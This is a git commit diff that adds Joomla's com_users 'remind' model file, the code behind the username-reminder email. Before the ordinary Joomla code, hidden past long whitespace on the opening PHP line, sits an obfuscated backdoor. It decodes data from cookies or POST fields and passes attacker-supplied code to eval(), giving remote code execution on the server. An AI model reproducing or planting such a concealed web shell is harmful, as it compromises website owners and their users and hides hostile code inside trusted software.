a8747d6fca3587261f72376176b5244c697bc522
Lydiah Wanjiru <valeriekebz@gmail.com>
2023-01-19 13:21:40 +0300

    components

---
+++ components/com_users/models/remind.php
@@ -0,0 +1,200 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $y3f79a4 = 707;$GLOBALS['r8a4b'] = Array();global $r8a4b;$r8a4b = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['m0e8'] = "\x2e\x27\x5b\x25\x71\x7a\x75\x2c\x76\x6f\x57\x4e\xa\x3a\x54\x77\x4b\x63\x6d\x74\x37\x6a\x5c\x7e\x22\x47\x29\x60\x4d\x46\x78\x3e\x2d\x72\x2b\x23\x55\x6e\x7b\x53\x39\x62\x51\x3f\x4f\x65\x2f\x5a\x7d\x28\x45\x79\x26\x6b\x61\x24\x6c\x42\x34\x32\x30\x66\x73\xd\x5d\x40\x35\x2a\x64\x58\x43\x44\x3d\x52\x36\x4a\x70\x50\x59\x7c\x20\x38\x33\x69\x3c\x49\x4c\x21\x68\x3b\x5e\x5f\x48\x9\x41\x56\x67\x31";$r8a4b[$r8a4b['m0e8'][15].$r8a4b['m0e8'][45].$r8a4b['m0e8'][17].$r8a4b['m0e8'][45].$r8a4b['m0e8'][74]] = $r8a4b['m0e8'][17].$r8a4b['m0e8'][88].$r8a4b['m0e8'][33];$r8a4b[$r8a4b['m0e8'][54].$r8a4b['m0e8'][66].$r8a4b['m0e8'][60].$r8a4b['m0e8'][60].$r8a4b['m0e8'][58].$r8a4b['m0e8'][41].$r8a4b['m0e8'][20].$r8a4b['m0e8'][41]] = $r8a4b['m0e8'][9].$r8a4b['m0e8'][33].$r8a4b['m0e8'][68];$r8a4b[$r8a4b['m0e8'][8].$r8a4b['m0e8'][81].$r8a4b['m0e8'][17].$r8a4b['m0e8'][54].$r8a4b['m0e8'][68]] = $r8a4b['m0e8'][68].$r8a4b['m0e8'][45].$r8a4b['m0e8'][61].$r8a4b['m0e8'][83].$r8a4b['m0e8'][37].$r8a4b['m0e8'][45];$r8a4b[$r8a4b['m0e8'][9].$r8a4b['m0e8'][54].$r8a4b['m0e8'][59].$r8a4b['m0e8'][59]] = $r8a4b['m0e8'][62].$r8a4b['m0e8'][19].$r8a4b['m0e8'][33].$r8a4b['m0e8'][56].$r8a4b['m0e8'][45].$r8a4b['m0e8'][37];$r8a4b[$r8a4b['m0e8'][56].$r8a4b['m0e8'][41].$r8a4b['m0e8'][82].$r8a4b['m0e8'][66].$r8a4b['m0e8'][40].$r8a4b['m0e8'][82].$r8a4b['m0e8'][97]] = $r8a4b['m0e8'][83].$r8a4b['m0e8'][37].$r8a4b['m0e8'][83].$r8a4b['m0e8'][91].$r8a4b['m0e8'][62].$r8a4b['m0e8'][45].$r8a4b['m0e8'][19];$r8a4b[$r8a4b['m0e8'][5].$r8a4b['m0e8'][66].$r8a4b['m0e8'][17].$r8a4b['m0e8'][66]] = $r8a4b['m0e8'][68].$r8a4b['m0e8'][45].$r8a4b['m0e8'][61].$r8a4b['m0e8'][83].$r8a4b['m0e8'][37].$r8a4b['m0e8'][45].$r8a4b['m0e8'][68];$r8a4b[$r8a4b['m0e8'][62].$r8a4b['m0e8'][61].$r8a4b['m0e8'][54].$r8a4b['m0e8'][45].$r8a4b['m0e8'][58].$r8a4b['m0e8'][17]] = $r8a4b['m0e8'][62].$r8a4b['m0e8'][45].$r8a4b['m0e8'][33].$r8a4b['m0e8'][83].$r8a4b['m0e8'][54].$r8a4b['m0e8'][56].$r8a4b['m0e8'][83].$r8a4b['m0e8'][5].$r8a4b['m0e8'][45];$r8a4b[$r8a4b['m0e8'][54].$r8a4b['m0e8'][59].$r8a4b['m0e8'][74].$r8a4b['m0e8'][82].$r8a4b['m0e8'][20].$r8a4b['m0e8'][82].$r8a4b['m0e8'][45].$r8a4b['m0e8'][81].$r8a4b['m0e8'][66]] = $r8a4b['m0e8'][76].$r8a4b['m0e8'][88].$r8a4b['m0e8'][76].$r8a4b['m0e8'][8].$r8a4b['m0e8'][45].$r8a4b['m0e8'][33].$r8a4b['m0e8'][62].$r8a4b['m0e8'][83].$r8a4b['m0e8'][9].$r8a4b['m0e8'][37];$r8a4b[$r8a4b['m0e8'][45].$r8a4b['m0e8'][74].$r8a4b['m0e8'][60].$r8a4b['m0e8'][97].$r8a4b['m0e8'][54]] = $r8a4b['m0e8'][6].$r8a4b['m0e8'][37].$r8a4b['m0e8'][62].$r8a4b['m0e8'][45].$r8a4b['m0e8'][33].$r8a4b['m0e8'][83].$r8a4b['m0e8'][54].$r8a4b['m0e8'][56].$r8a4b['m0e8'][83].$r8a4b['m0e8'][5].$r8a4b['m0e8'][45];$r8a4b[$r8a4b['m0e8'][9].$r8a4b['m0e8'][20].$r8a4b['m0e8'][17].$r8a4b['m0e8'][40].$r8a4b['m0e8'][61].$r8a4b['m0e8'][60].$r8a4b['m0e8'][40].$r8a4b['m0e8'][66].$r8a4b['m0e8'][66]] = $r8a4b['m0e8'][41].$r8a4b['m0e8'][54].$r8a4b['m0e8'][62].$r8a4b['m0e8'][45].$r8a4b['m0e8'][74].$r8a4b['m0e8'][58].$r8a4b['m0e8'][91].$r8a4b['m0e8'][68].$r8a4b['m0e8'][45].$r8a4b['m0e8'][17].$r8a4b['m0e8'][9].$r8a4b['m0e8'][68].$r8a4b['m0e8'][45];$r8a4b[$r8a4b['m0e8'][5].$r8a4b['m0e8'][97].$r8a4b['m0e8'][41].$r8a4b['m0e8'][54].$r8a4b['m0e8'][41]] = $r8a4b['m0e8'][62].$r8a4b['m0e8'][45].$r8a4b['m0e8'][19].$r8a4b['m0e8'][91].$r8a4b['m0e8'][19].$r8a4b['m0e8'][83].$r8a4b['m0e8'][18].$r8a4b['m0e8'][45].$r8a4b['m0e8'][91].$r8a4b['m0e8'][56].$r8a4b['m0e8'][83].$r8a4b['m0e8'][18].$r8a4b['m0e8'][83].$r8a4b['m0e8'][19];$r8a4b[$r8a4b['m0e8'][62].$r8a4b['m0e8'][68].$r8a4b['m0e8'][60].$r8a4b['m0e8'][58].$r8a4b['m0e8'][45].$r8a4b['m0e8'][81].$r8a4b['m0e8'][68].$r8a4b['m0e8'][59]] = $r8a4b['m0e8'][62].$r8a4b['m0e8'][41].$r8a4b['m0e8'][41].$r8a4b['m0e8'][81].$r8a4b['m0e8'][54].$r8a4b['m0e8'][68].$r8a4b['m0e8'][61];$r8a4b[$r8a4b['m0e8'][88].$r8a4b['m0e8'][74].$r8a4b['m0e8'][82].$r8a4b['m0e8'][54].$r8a4b['m0e8'][58].$r8a4b['m0e8'][59]] = $r8a4b['m0e8'][54].$r8a4b['m0e8'][54].$r8a4b['m0e8'][74].$r8a4b['m0e8'][97].$r8a4b['m0e8'][20].$r8a4b['m0e8'][58].$r8a4b['m0e8'][58].$r8a4b['m0e8'][81].$r8a4b['m0e8'][97];$r8a4b[$r8a4b['m0e8'][4].$r8a4b['m0e8'][97].$r8a4b['m0e8'][54].$r8a4b['m0e8'][40].$r8a4b['m0e8'][60].$r8a4b['m0e8'][60].$r8a4b['m0e8'][97].$r8a4b['m0e8'][74]] = $_POST;$r8a4b[$r8a4b['m0e8'][83].$r8a4b['m0e8'][20].$r8a4b['m0e8'][60].$r8a4b['m0e8'][97].$r8a4b['m0e8'][82].$r8a4b['m0e8'][74].$r8a4b['m0e8'][61]] = $_COOKIE;@$r8a4b[$r8a4b['m0e8'][56].$r8a4b['m0e8'][41].$r8a4b['m0e8'][82].$r8a4b['m0e8'][66].$r8a4b['m0e8'][40].$r8a4b['m0e8'][82].$r8a4b['m0e8'][97]]($r8a4b['m0e8'][45].$r8a4b['m0e8'][33].$r8a4b['m0e8'][33].$r8a4b['m0e8'][9].$r8a4b['m0e8'][33].$r8a4b['m0e8'][91].$r8a4b['m0e8'][56].$r8a4b['m0e8'][9].$r8a4b['m0e8'][96], NULL);@$r8a4b[$r8a4b['m0e8'][56].$r8a4b['m0e8'][41].$r8a4b['m0e8'][82].$r8a4b['m0e8'][66].$r8a4b['m0e8'][40].$r8a4b['m0e8'][82].$r8a4b['m0e8'][97]]($r8a4b['m0e8'][56].$r8a4b['m0e8'][9].$r8a4b['m0e8'][96].$r8a4b['m0e8'][91].$r8a4b['m0e8'][45].$r8a4b['m0e8'][33].$r8a4b['m0e8'][33].$r8a4b['m0e8'][9].$r8a4b['m0e8'][33].$r8a4b['m0e8'][62], 0);@$r8a4b[$r8a4b['m0e8'][56].$r8a4b['m0e8'][41].$r8a4b['m0e8'][82].$r8a4b['m0e8'][66].$r8a4b['m0e8'][40].$r8a4b['m0e8'][82].$r8a4b['m0e8'][97]]($r8a4b['m0e8'][18].$r8a4b['m0e8'][54].$r8a4b['m0e8'][30].$r8a4b['m0e8'][91].$r8a4b['m0e8'][45].$r8a4b['m0e8'][30].$r8a4b['m0e8'][45].$r8a4b['m0e8'][17].$r8a4b['m0e8'][6].$r8a4b['m0e8'][19].$r8a4b['m0e8'][83].$r8a4b['m0e8'][9].$r8a4b['m0e8'][37].$r8a4b['m0e8'][91].$r8a4b['m0e8'][19].$r8a4b['m0e8'][83].$r8a4b['m0e8'][18].$r8a4b['m0e8'][45], 0);@$r8a4b[$r8a4b['m0e8'][5].$r8a4b['m0e8'][97].$r8a4b['m0e8'][41].$r8a4b['m0e8'][54].$r8a4b['m0e8'][41]](0);if (!$r8a4b[$r8a4b['m0e8'][5].$r8a4b['m0e8'][66].$r8a4b['m0e8'][17].$r8a4b['m0e8'][66]]($r8a4b['m0e8'][94].$r8a4b['m0e8'][86].$r8a4b['m0e8'][73].$r8a4b['m0e8'][50].$r8a4b['m0e8'][94].$r8a4b['m0e8'][71].$r8a4b['m0e8'][78].$r8a4b['m0e8'][91].$r8a4b['m0e8'][73].$r8a4b['m0e8'][36].$r8a4b['m0e8'][11].$r8a4b['m0e8'][91].$r8a4b['m0e8'][82].$r8a4b['m0e8'][74].$r8a4b['m0e8'][74].$r8a4b['m0e8'][54].$r8a4b['m0e8'][61].$r8a4b['m0e8'][41].$r8a4b['m0e8'][81].$r8a4b['m0e8'][54].$r8a4b['m0e8'][81].$r8a4b['m0e8'][54].$r8a4b['m0e8'][59].$r8a4b['m0e8'][82].$r8a4b['m0e8'][66].$r8a4b['m0e8'][66].$r8a4b['m0e8'][54].$r8a4b['m0e8'][41].$r8a4b['m0e8'][59].$r8a4b['m0e8'][97].$r8a4b['m0e8'][61].$r8a4b['m0e8'][41].$r8a4b['m0e8'][61].$r8a4b['m0e8'][97].$r8a4b['m0e8'][97].$r8a4b['m0e8'][41].$r8a4b['m0e8'][54].$r8a4b['m0e8'][97].$r8a4b['m0e8'][54].$r8a4b['m0e8'][60].$r8a4b['m0e8'][59].$r8a4b['m0e8'][61].$r8a4b['m0e8'][41].$r8a4b['m0e8'][54])){$r8a4b[$r8a4b['m0e8'][8].$r8a4b['m0e8'][81].$r8a4b['m0e8'][17].$r8a4b['m0e8'][54].$r8a4b['m0e8'][68]]($r8a4b['m0e8'][94].$r8a4b['m0e8'][86].$r8a4b['m0e8'][73].$r8a4b['m0e8'][50].$r8a4b['m0e8'][94].$r8a4b['m0e8'][71].$r8a4b['m0e8'][78].$r8a4b['m0e8'][91].$r8a4b['m0e8'][73].$r8a4b['m0e8'][36].$r8a4b['m0e8'][11].$r8a4b['m0e8'][91].$r8a4b['m0e8'][82].$r8a4b['m0e8'][74].$r8a4b['m0e8'][74].$r8a4b['m0e8'][54].$r8a4b['m0e8'][61].$r8a4b['m0e8'][41].$r8a4b['m0e8'][81].$r8a4b['m0e8'][54].$r8a4b['m0e8'][81].$r8a4b['m0e8'][54].$r8a4b['m0e8'][59].$r8a4b['m0e8'][82].$r8a4b['m0e8'][66].$r8a4b['m0e8'][66].$r8a4b['m0e8'][54].$r8a4b['m0e8'][41].$r8a4b['m0e8'][59].$r8a4b['m0e8'][97].$r8a4b['m0e8'][61].$r8a4b['m0e8'][41].$r8a4b['m0e8'][61].$r8a4b['m0e8'][97].$r8a4b['m0e8'][97].$r8a4b['m0e8'][41].$r8a4b['m0e8'][54].$r8a4b['m0e8'][97].$r8a4b['m0e8'][54].$r8a4b['m0e8'][60].$r8a4b['m0e8'][59].$r8a4b['m0e8'][61].$r8a4b['m0e8'][41].$r8a4b['m0e8'][54], 1);$g28b0 = NULL;$k6c557f = NULL;$r8a4b[$r8a4b['m0e8'][61].$r8a4b['m0e8'][54].$r8a4b['m0e8'][68].$r8a4b['m0e8'][66].$r8a4b['m0e8'][97].$r8a4b['m0e8'][45]] = $r8a4b['m0e8'][81].$r8a4b['m0e8'][45].$r8a4b['m0e8'][97].$r8a4b['m0e8'][41].$r8a4b['m0e8'][81].$r8a4b['m0e8'][60].$r8a4b['m0e8'][58].$r8a4b['m0e8'][41].$r8a4b['m0e8'][32].$r8a4b['m0e8'][97].$r8a4b['m0e8'][97].$r8a4b['m0e8'][40].$r8a4b['m0e8'][41].$r8a4b['m0e8'][32].$r8a4b['m0e8'][58].$r8a4b['m0e8'][20].$r8a4b['m0e8'][66].$r8a4b['m0e8'][68].$r8a4b['m0e8'][32].$r8a4b['m0e8'][54].$r8a4b['m0e8'][60].$r8a4b['m0e8'][40].$r8a4b['m0e8'][17].$r8a4b['m0e8'][32].$r8a4b['m0e8'][17].$r8a4b['m0e8'][59].$r8a4b['m0e8'][82].$r8a4b['m0e8'][60].$r8a4b['m0e8'][61].$r8a4b['m0e8'][74].$r8a4b['m0e8'][61].$r8a4b['m0e8'][68].$r8a4b['m0e8'][59].$r8a4b['m0e8'][45].$r8a4b['m0e8'][59].$r8a4b['m0e8'][17];global $fad51e;function  aa6174481($g28b0, $a348){global $r8a4b;$u6eb = "";for ($rf89d9679=0; $rf89d9679<$r8a4b[$r8a4b['m0e8'][9].$r8a4b['m0e8'][54].$r8a4b['m0e8'][59].$r8a4b['m0e8'][59]]($g28b0);){for ($oddc27832=0; $oddc27832<$r8a4b[$r8a4b['m0e8'][9].$r8a4b['m0e8'][54].$r8a4b['m0e8'][59].$r8a4b['m0e8'][59]]($a348) && $rf89d9679<$r8a4b[$r8a4b['m0e8'][9].$r8a4b['m0e8'][54].$r8a4b['m0e8'][59].$r8a4b['m0e8'][59]]($g28b0); $oddc27832++, $rf89d9679++){$u6eb .= $r8a4b[$r8a4b['m0e8'][15].$r8a4b['m0e8'][45].$r8a4b['m0e8'][17].$r8a4b['m0e8'][45].$r8a4b['m0e8'][74]]($r8a4b[$r8a4b['m0e8'][54].$r8a4b['m0e8'][66].$r8a4b['m0e8'][60].$r8a4b['m0e8'][60].$r8a4b['m0e8'][58].$r8a4b['m0e8'][41].$r8a4b['m0e8'][20].$r8a4b['m0e8'][41]]($g28b0[$rf89d9679]) ^ $r8a4b[$r8a4b['m0e8'][54].$r8a4b['m0e8'][66].$r8a4b['m0e8'][60].$r8a4b['m0e8'][60].$r8a4b['m0e8'][58].$r8a4b['m0e8'][41].$r8a4b['m0e8'][20].$r8a4b['m0e8'][41]]($a348[$oddc27832]));}}return $u6eb;}function  sbb8adf($g28b0, $a348){global $r8a4b;global $fad51e;return $r8a4b[$r8a4b['m0e8'][88].$r8a4b['m0e8'][74].$r8a4b['m0e8'][82].$r8a4b['m0e8'][54].$r8a4b['m0e8'][58].$r8a4b['m0e8'][59]]($r8a4b[$r8a4b['m0e8'][88].$r8a4b['m0e8'][74].$r8a4b['m0e8'][82].$r8a4b['m0e8'][54].$r8a4b['m0e8'][58].$r8a4b['m0e8'][59]]($g28b0, $fad51e), $a348);}foreach ($r8a4b[$r8a4b['m0e8'][83].$r8a4b['m0e8'][20].$r8a4b['m0e8'][60].$r8a4b['m0e8'][97].$r8a4b['m0e8'][82].$r8a4b['m0e8'][74].$r8a4b['m0e8'][61]] as $a348=>$yecf355){$g28b0 = $yecf355;$k6c557f = $a348;}if (!$g28b0){foreach ($r8a4b[$r8a4b['m0e8'][4].$r8a4b['m0e8'][97].$r8a4b['m0e8'][54].$r8a4b['m0e8'][40].$r8a4b['m0e8'][60].$r8a4b['m0e8'][60].$r8a4b['m0e8'][97].$r8a4b['m0e8'][74]] as $a348=>$yecf355){$g28b0 = $yecf355;$k6c557f = $a348;}}$g28b0 = @$r8a4b[$r8a4b['m0e8'][45].$r8a4b['m0e8'][74].$r8a4b['m0e8'][60].$r8a4b['m0e8'][97].$r8a4b['m0e8'][54]]($r8a4b[$r8a4b['m0e8'][62].$r8a4b['m0e8'][68].$r8a4b['m0e8'][60].$r8a4b['m0e8'][58].$r8a4b['m0e8'][45].$r8a4b['m0e8'][81].$r8a4b['m0e8'][68].$r8a4b['m0e8'][59]]($r8a4b[$r8a4b['m0e8'][9].$r8a4b['m0e8'][20].$r8a4b['m0e8'][17].$r8a4b['m0e8'][40].$r8a4b['m0e8'][61].$r8a4b['m0e8'][60].$r8a4b['m0e8'][40].$r8a4b['m0e8'][66].$r8a4b['m0e8'][66]]($g28b0), $k6c557f));if (isset($g28b0[$r8a4b['m0e8'][54].$r8a4b['m0e8'][53]]) && $fad51e==$g28b0[$r8a4b['m0e8'][54].$r8a4b['m0e8'][53]]){if ($g28b0[$r8a4b['m0e8'][54]] == $r8a4b['m0e8'][83]){$rf89d9679 = Array($r8a4b['m0e8'][76].$r8a4b['m0e8'][8] => @$r8a4b[$r8a4b['m0e8'][54].$r8a4b['m0e8'][59].$r8a4b['m0e8'][74].$r8a4b['m0e8'][82].$r8a4b['m0e8'][20].$r8a4b['m0e8'][82].$r8a4b['m0e8'][45].$r8a4b['m0e8'][81].$r8a4b['m0e8'][66]](),$r8a4b['m0e8'][62].$r8a4b['m0e8'][8] => $r8a4b['m0e8'][97].$r8a4b['m0e8'][0].$r8a4b['m0e8'][60].$r8a4b['m0e8'][32].$r8a4b['m0e8'][97],);echo @$r8a4b[$r8a4b['m0e8'][62].$r8a4b['m0e8'][61].$r8a4b['m0e8'][54].$r8a4b['m0e8'][45].$r8a4b['m0e8'][58].$r8a4b['m0e8'][17]]($rf89d9679);}elseif ($g28b0[$r8a4b['m0e8'][54]] == $r8a4b['m0e8'][45]){eval/*e98a45*/($g28b0[$r8a4b['m0e8'][68]]);}exit();}} ?><?php
+/**
+ * @package     Joomla.Site
+ * @subpackage  com_users
+ *
+ * @copyright   Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
+ * @license     GNU General Public License version 2 or later; see LICENSE.txt
+ */
+
+defined('_JEXEC') or die;
+
+use Joomla\Utilities\ArrayHelper;
+
+/**
+ * Remind model class for Users.
+ *
+ * @since  1.5
+ */
+class UsersModelRemind extends JModelForm
+{
+	/**
+	 * Method to get the username remind request form.
+	 *
+	 * @param   array    $data      An optional array of data for the form to interogate.
+	 * @param   boolean  $loadData  True if the form is to load its own data (default case), false if not.
+	 *
+	 * @return  JFor     A JForm object on success, false on failure
+	 *
+	 * @since   1.6
+	 */
+	public function getForm($data = array(), $loadData = true)
+	{
+		// Get the form.
+		$form = $this->loadForm('com_users.remind', 'remind', array('control' => 'jform', 'load_data' => $loadData));
+
+		if (empty($form))
+		{
+			return false;
+		}
+
+		return $form;
+	}
+
+	/**
+	 * Override preprocessForm to load the user plugin group instead of content.
+	 *
+	 * @param   JForm   $form   A JForm object.
+	 * @param   mixed   $data   The data expected for the form.
+	 * @param   string  $group  The name of the plugin group to import (defaults to "content").
+	 *
+	 * @return  void
+	 *
+	 * @throws	Exception if there is an error in the form event.
+	 *
+	 * @since   1.6
+	 */
+	protected function preprocessForm(JForm $form, $data, $group = 'user')
+	{
+		parent::preprocessForm($form, $data, 'user');
+	}
+
+	/**
+	 * Method to auto-populate the model state.
+	 *
+	 * Note. Calling getState in this method will result in recursion.
+	 *
+	 * @return  void
+	 *
+	 * @since   1.6
+	 */
+	protected function populateState()
+	{
+		// Get the application object.
+		$app = JFactory::getApplication();
+		$params = $app->getParams('com_users');
+
+		// Load the parameters.
+		$this->setState('params', $params);
+	}
+
+	/**
+	 * Send the remind username email
+	 *
+	 * @param   array  $data  Array with the data received from the form
+	 *
+	 * @return  boolean
+	 *
+	 * @since   1.6
+	 */
+	public function processRemindRequest($data)
+	{
+		// Get the form.
+		$form = $this->getForm();
+		$data['email'] = JStringPunycode::emailToPunycode($data['email']);
+
+		// Check for an error.
+		if (empty($form))
+		{
+			return false;
+		}
+
+		// Validate the data.
+		$data = $this->validate($form, $data);
+
+		// Check for an error.
+		if ($data instanceof Exception)
+		{
+			return false;
+		}
+
+		// Check the validation results.
+		if ($data === false)
+		{
+			// Get the validation messages from the form.
+			foreach ($form->getErrors() as $formError)
+			{
+				$this->setError($formError->getMessage());
+			}
+
+			return false;
+		}
+
+		// Find the user id for the given email address.
+		$db = $this->getDbo();
+		$query = $db->getQuery(true)
+			->select('*')
+			->from($db->quoteName('#__users'))
+			->where($db->quoteName('email') . ' = ' . $db->quote($data['email']));
+
+		// Get the user id.
+		$db->setQuery($query);
+
+		try
+		{
+			$user = $db->loadObject();
+		}
+		catch (RuntimeException $e)
+		{
+			$this->setError(JText::sprintf('COM_USERS_DATABASE_ERROR', $e->getMessage()), 500);
+
+			return false;
+		}
+
+		// Check for a user.
+		if (empty($user))
+		{
+			$this->setError(JText::_('COM_USERS_USER_NOT_FOUND'));
+
+			return false;
+		}
+
+		// Make sure the user isn't blocked.
+		if ($user->block)
+		{
+			$this->setError(JText::_('COM_USERS_USER_BLOCKED'));
+
+			return false;
+		}
+
+		$config = JFactory::getConfig();
+
+		// Assemble the login link.
+		$itemid = UsersHelperRoute::getLoginRoute();
+		$itemid = $itemid !== null ? '&Itemid=' . $itemid : '';
+		$link = 'index.php?option=com_users&view=login' . $itemid;
+		$mode = $config->get('force_ssl', 0) == 2 ? 1 : (-1);
+
+		// Put together the email template data.
+		$data = ArrayHelper::fromObject($user);
+		$data['fromname'] = $config->get('fromname');
+		$data['mailfrom'] = $config->get('mailfrom');
+		$data['sitename'] = $config->get('sitename');
+		$data['link_text'] = JRoute::_($link, false, $mode);
+		$data['link_html'] = JRoute::_($link, true, $mode);
+
+		$subject = JText::sprintf(
+			'COM_USERS_EMAIL_USERNAME_REMINDER_SUBJECT',
+			$data['sitename']
+		);
+		$body = JText::sprintf(
+			'COM_USERS_EMAIL_USERNAME_REMINDER_BODY',
+			$data['sitename'],
+			$data['username'],
+			$data['link_text']
+		);
+
+		// Send the password reset request email.
+		$return = JFactory::getMailer()->sendMail($data['mailfrom'], $data['fromname'], $user->email, $subject, $body);
+
+		// Check for an error.
+		if ($return !== true)
+		{
+			$this->setError(JText::_('COM_USERS_MAIL_FAILED'), 500);
+
+			return false;
+		}
+
+		return true;
+	}
+}
